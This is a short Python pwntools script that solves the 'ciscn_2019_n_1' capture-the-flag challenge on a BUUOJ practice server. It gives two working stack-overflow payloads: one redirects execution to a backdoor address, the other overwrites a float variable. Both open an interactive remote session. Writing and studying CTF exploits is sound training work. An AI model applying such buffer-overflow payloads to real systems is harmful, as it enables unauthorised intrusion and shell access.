#https://blog.csdn.net/weixin_44570459/article/details/152665505
from pwn import *

p = remote('node5.buuoj.cn', 25846)
elf = ELF('ciscn_2019_n_1')

backdoor_addr = 0x4006BE
payload = b'A' * (0x30 + 0x8) + p64(backdoor_addr)

p.sendline(payload)
p.interactive()


'''
w2

from pwn import *

p = remote('node5.buuoj.cn', 25846)
elf = ELF('ciscn_2019_n_1')

payload = b'A' * (0x30 - 0x4) + p64(0x41348000)

p.sendline(payload)
p.interactive()
'''